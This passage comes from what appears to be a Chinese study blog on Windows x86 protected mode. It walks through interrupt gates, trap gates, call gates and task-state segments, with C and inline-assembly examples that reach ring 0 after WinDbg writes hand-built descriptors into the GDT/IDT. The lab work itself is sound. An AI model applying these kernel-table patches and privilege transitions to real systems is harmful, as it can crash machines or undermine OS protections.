class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功执行：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220926205843621.png"></p><h1 id="014-中断门"><a href="#014-中断门" class="headerlink" title="014.中断门"></a>014.中断门</h1><p>win中没有使用调用门，但是使用了中断门，比如系统调用和调试。</p><p>（老的CPU使用的是系统调用，新的是使用快速调用）</p><p>IDT表，即中断描述符表，每个描述符都占8字节，IDT的第一个不为空：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917100944324.png"></p><p>IDT表中只有三种描述符：</p><ol><li>任务门描述符</li><li>中断门描述符</li><li>陷阱们描述符</li></ol><h2 id="中断门描述符"><a href="#中断门描述符" class="headerlink" title="中断门描述符"></a>中断门描述符</h2><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917101400290.png"></p><h2 id="提权-amp-不提权"><a href="#提权-amp-不提权" class="headerlink" title="提权&amp;不提权"></a>提权&amp;不提权</h2><p>提权&amp;不提权时的栈情况：</p><ul><li>不提权时：压入<code>EFLAF</code>，<code>CS</code>，<code>EIP</code></li><li>提权时：压入<code>EFLAF</code>，<code>CS</code>，<code>EIP</code>，并且压入<code>SS</code>和<code>ESP</code></li></ul><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220926212001922.png"></p><p>构造中断门：<code>0000EE00 00080000</code></p><h2 id="读取IDT表项"><a href="#读取IDT表项" class="headerlink" title="读取IDT表项"></a>读取IDT表项</h2><p>在IDT表中找个p&#x3D;0的无效项</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917103115783.png"></p><p>可以看到正确读取了</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917103501066.png"></p><p>当<strong>CPL&#x3D;DPL</strong>时，才能成功触发中断。</p><h2 id="调用门中使用IRETD返回，中断门实现RETF返回"><a href="#调用门中使用IRETD返回，中断门实现RETF返回" class="headerlink" title="调用门中使用IRETD返回，中断门实现RETF返回"></a>调用门中使用IRETD返回，中断门实现RETF返回</h2><p>这里要对调用门(提权)和中断门(提权)的栈情况有了解。（见上面几小节</p><p>popfd将EFLAG弹出。</p><h3 id="中断门"><a href="#中断门" class="headerlink" title="中断门"></a>中断门</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE IDTItem0[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// R0 函数，读取了IDT表第一项</span></span><br><span class="line"><span class="comment">// 00401000</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//int 3 // 调试用的</span></span><br><span class="line">pushad</span><br><span class="line">pushfd</span><br><span class="line">mov eax,<span class="number">0x8003f400</span></span><br><span class="line">mov ebx,[eax]</span><br><span class="line">mov ecx,[eax+<span class="number">0x4</span>]</span><br><span class="line">mov dword ptr ds:[IDTItem0],ebx</span><br><span class="line">mov dword ptr ds:[IDTItem0+<span class="number">0x4</span>],ecx</span><br><span class="line"></span><br><span class="line"><span class="comment">// 要求用 retf 返回</span></span><br><span class="line">add esp,<span class="number">0x2c</span><span class="comment">// esp指向eflags</span></span><br><span class="line">popfd<span class="comment">// esp指向3环esp</span></span><br><span class="line">mov eax,[esp]<span class="comment">// 将原ESP和SS向低地址移动4字节</span></span><br><span class="line">mov [esp<span class="number">-0x4</span>],eax</span><br><span class="line">mov eax,[esp+<span class="number">0x4</span>]</span><br><span class="line">mov [esp],eax</span><br><span class="line"></span><br><span class="line">sub esp,<span class="number">0x30</span><span class="comment">// 还原esp</span></span><br><span class="line">popfd</span><br><span class="line">popad</span><br><span class="line"></span><br><span class="line">retf</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm </span><br><span class="line">&#123;</span><br><span class="line">INT <span class="number">0x20</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x %08x\n&quot;</span>, *(PDWORD)IDTItem0, *(PDWORD)((PBYTE)IDTItem0+<span class="number">0x4</span>));</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功返回：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220926213928875.png"></p><h3 id="调用门"><a href="#调用门" class="headerlink" title="调用门"></a>调用门</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwHigh2GValue;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数通过 CALL FAR 调用，使用调用门提权，拥有0环权限</span></span><br><span class="line"><span class="comment">// 00401000</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">pushad</span><br><span class="line">pushfd</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取了GDT表第二项的低4字节</span></span><br><span class="line">mov eax,<span class="number">0x8003f008</span></span><br><span class="line">mov eax,[eax]</span><br><span class="line">mov dwHigh2GValue,eax</span><br><span class="line"></span><br><span class="line"><span class="comment">// 要求用 iretd 返回</span></span><br><span class="line">add esp,<span class="number">0x30</span><span class="comment">// esp指向ss</span></span><br><span class="line"></span><br><span class="line">mov eax,[esp]<span class="comment">// 将原ESP和SS向高地址移动4字节</span></span><br><span class="line">mov [esp+<span class="number">0x4</span>],eax</span><br><span class="line">mov eax,[esp<span class="number">-0x4</span>]</span><br><span class="line">mov [esp],eax</span><br><span class="line">pushfd</span><br><span class="line">sub esp,<span class="number">0x2c</span><span class="comment">// 还原esp</span></span><br><span class="line"></span><br><span class="line">popfd</span><br><span class="line">popad</span><br><span class="line"></span><br><span class="line">iretd</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">call fword ptr [buff] <span class="comment">// 长调用，使用调用门提权</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>,dwHigh2GValue);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功返回：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220926214258402.png"></p><h1 id="015-陷阱门"><a href="#015-陷阱门" class="headerlink" title="015.陷阱门"></a>015.陷阱门</h1><p> 陷阱门描述符：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917104302437.png"></p><p>构造一个陷阱门描述符：<code>0000EF00 0008 0000</code></p><p>陷阱门与中断门几乎一直，唯一区别是：中断门执行时，将IF位清零，但陷阱门不会。</p><h1 id="0x16-任务段"><a href="#0x16-任务段" class="headerlink" title="0x16.任务段"></a>0x16.任务段</h1><p>调用门中断门与陷阱门出现权限切换时，堆栈回切换，由于CS的CPL发生改变，也导致了SS也必须要切换。</p><p>切换时，会有新的ESP和SS(CS是由中断门或者调用门指定)，这两个值是从TSS (Task-state segment )，任务状态段，而来</p><p>TSS是一块内存，大小为104字节：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917172922264.png"></p><p><strong>作用：同时切换一堆寄存器(任务切换)</strong></p><p>TSS的地址在<code>TR</code>段寄存器中。</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917173106598.png"></p><p>TSS段描述符：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917173121555.png"></p><h2 id="TR寄存器的读写"><a href="#TR寄存器的读写" class="headerlink" title="TR寄存器的读写"></a>TR寄存器的读写</h2><ol><li><p>将TSS段描述符加载到TR寄存器</p><p>指令：LTR</p><p>说明：</p><ul><li><pre><code> 用LTR指令去装载的话，仅仅是改变TR寄存器的值(96位) ，并没有真正改变TSS </code></pre></li><li><pre><code> LTR指令只能在系统层使用</code></pre></li><li><pre><code> 加载后TSS段描述符会状态位会发生改变</code></pre></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV AX,SelectorTSS</span><br><span class="line">LTR AX</span><br></pre></td></tr></table></figure></li><li><p>读TR寄存器</p><p>指令：<code>STR</code></p><p>说明：如果用STR去读的话，只读了TR的16位，也就是选择子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STR AX</span><br></pre></td></tr></table></figure></li></ol><h1 id="0x17-任务段"><a href="#0x17-任务段" class="headerlink" title="0x17.任务段"></a>0x17.任务段</h1><p>CPU通过<code>TR段寄存器</code>来找到TSS，如果我们想用自己的TSS段来替换原来的寄存器，就要修改TR寄存器，TR寄存器的值又是来自TSS段描述符，那么我们接下来先构造一个段描述符</p><h2 id="修改TR寄存器"><a href="#修改TR寄存器" class="headerlink" title="修改TR寄存器"></a>修改TR寄存器</h2><ol><li><p>在Ring0 我们可以通过<code>LTR</code>指令去修改TR寄存器</p></li><li><p>在Ring3 我们可以通过<code>CALL FAR</code> 或者 <code>JMP FAR</code>指令来修改</p></li></ol><p>用JMP去访问一个代码段的时候，改变的是CS和EIP ：</p><ol><li><p>JMP 0x48:0x123456  如果0x48是代码段 </p></li><li><p>执行后：CS–&gt;0x48  EIP–&gt;0x123456</p></li></ol><p>用JMP去访问一个任务段的时候：</p><ol><li>如果0x48是TSS段描述符，先修改TR寄存器，</li><li>再用TR.Base指向的TSS中的值修改当前的寄存器</li></ol><h2 id="CALL访问任务段，正确返回"><a href="#CALL访问任务段，正确返回" class="headerlink" title="CALL访问任务段，正确返回"></a>CALL访问任务段，正确返回</h2><p>构造TSS段描述符：<code>xx00 E9xx xxxx0068</code></p><p><code>eq xxxxxxx 0000E93A 00000068</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!process 0 0//查看Dirbase，即CR3</span><br></pre></td></tr></table></figure><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917214509330.png"></p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917214430495.png"></p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwOk;</span><br><span class="line">DWORD dwESP;</span><br><span class="line">DWORD dwCS;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务切换后的EIP</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Func()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">pushad</span><br><span class="line">pushfd</span><br><span class="line"></span><br><span class="line">push fs</span><br><span class="line"><span class="keyword">int</span> <span class="number">3</span> <span class="comment">// int 3 会修改FS</span></span><br><span class="line">pop fs</span><br><span class="line"></span><br><span class="line">mov eax,<span class="number">1</span></span><br><span class="line">mov dword ptr ds:[dwOk],eax</span><br><span class="line">mov eax,esp</span><br><span class="line">mov dword ptr ds:[dwESP],eax</span><br><span class="line">mov ax,cs</span><br><span class="line">mov word ptr ds:[dwCS],ax</span><br><span class="line"></span><br><span class="line">popfd</span><br><span class="line">popad</span><br><span class="line">iretd</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwCr3; <span class="comment">// windbg获取</span></span><br><span class="line"><span class="keyword">char</span> esp[<span class="number">0x1000</span>]; <span class="comment">// 任务切换后的栈，数组名就是ESP</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 此数组的地址就是TSS描述符中的Base</span></span><br><span class="line">DWORD *TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (TSS == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc 失败，%d\n&quot;</span>, GetLastError());</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %02x00e9%02x`%04x0068\n&quot;</span>, ((DWORD)TSS&gt;&gt;<span class="number">24</span>) &amp; <span class="number">0x000000FF</span>,((DWORD)TSS&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x000000FF</span>, (WORD)TSS);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请在windbg中执行!process 0 0，复制TSS.exe进程DirBase的值，并输入.\nCR3: &quot;</span>); <span class="comment">// 在windbg中执行 !process 0 0 获取，DirBase: 13600420  这个数要启动程序后现查</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3); <span class="comment">// 注意是%x</span></span><br><span class="line"></span><br><span class="line">TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link CPU填充，表示上一个任务的选择子</span></span><br><span class="line">TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3 学到页就知道是啥了</span></span><br><span class="line">TSS[<span class="number">8</span>] = (DWORD)R0Func; <span class="comment">// EIP</span></span><br><span class="line">TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">TSS[<span class="number">14</span>] = (DWORD)esp+<span class="number">0x900</span>; <span class="comment">// ESP，解释：esp是一个0x1000的字节数组，作为裸函数的栈，这里传进去的应该是高地址，压栈才不会越界</span></span><br><span class="line">TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">call fword ptr[buff]</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ok: %d\nESP: %x\nCS: %x\n&quot;</span>, dwOk, dwESP, dwCS);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是通过CALL去访问任务段，下面是通过JMP访问，并且可以返回：</p><h2 id="JMP访问任务段，正确返回"><a href="#JMP访问任务段，正确返回" class="headerlink" title="JMP访问任务段，正确返回"></a>JMP访问任务段，正确返回</h2><p>和CALL FAR对比，NT位不会置1，TSS previous task link 也不会填充旧的TR，因此想要返回，可以先保存旧的TR，然后JMP FAR回去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwOk;</span><br><span class="line">DWORD dwESP;</span><br><span class="line">DWORD dwCS;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务切换后的EIP</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Func()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">pushad</span><br><span class="line">pushfd</span><br><span class="line"></span><br><span class="line">push fs</span><br><span class="line"><span class="keyword">int</span> <span class="number">3</span> <span class="comment">// int 3 会修改FS</span></span><br><span class="line">pop fs</span><br><span class="line"></span><br><span class="line">mov eax,<span class="number">1</span></span><br><span class="line">mov dword ptr ds:[dwOk],eax</span><br><span class="line">mov eax,esp</span><br><span class="line">mov dword ptr ds:[dwESP],eax</span><br><span class="line">mov ax,cs</span><br><span class="line">mov word ptr ds:[dwCS],ax</span><br><span class="line"></span><br><span class="line">popfd</span><br><span class="line">popad</span><br><span class="line">iretd</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwCr3; <span class="comment">// windbg获取</span></span><br><span class="line"><span class="keyword">char</span> esp[<span class="number">0x1000</span>]; <span class="comment">// 任务切换后的栈，数组名就是ESP</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 此数组的地址就是TSS描述符中的Base</span></span><br><span class="line">DWORD *TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (TSS == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc 失败，%d\n&quot;</span>, GetLastError());</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %02x00e9%02x`%04x0068\n&quot;</span>, ((DWORD)TSS&gt;&gt;<span class="number">24</span>) &amp; <span class="number">0x000000FF</span>,((DWORD)TSS&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x000000FF</span>, (WORD)TSS);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请在windbg中执行!process 0 0，复制TSS.exe进程DirBase的值，并输入.\nCR3: &quot;</span>); <span class="comment">// 在windbg中执行 !process 0 0 获取，DirBase: 13600420  这个数要启动程序后现查</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3); <span class="comment">// 注意是%x</span></span><br><span class="line"></span><br><span class="line">TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link CPU填充，表示上一个任务的选择子</span></span><br><span class="line">TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3 学到页就知道是啥了</span></span><br><span class="line">TSS[<span class="number">8</span>] = (DWORD)R0Func; <span class="comment">// EIP</span></span><br><span class="line">TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">TSS[<span class="number">11</span>] = <span 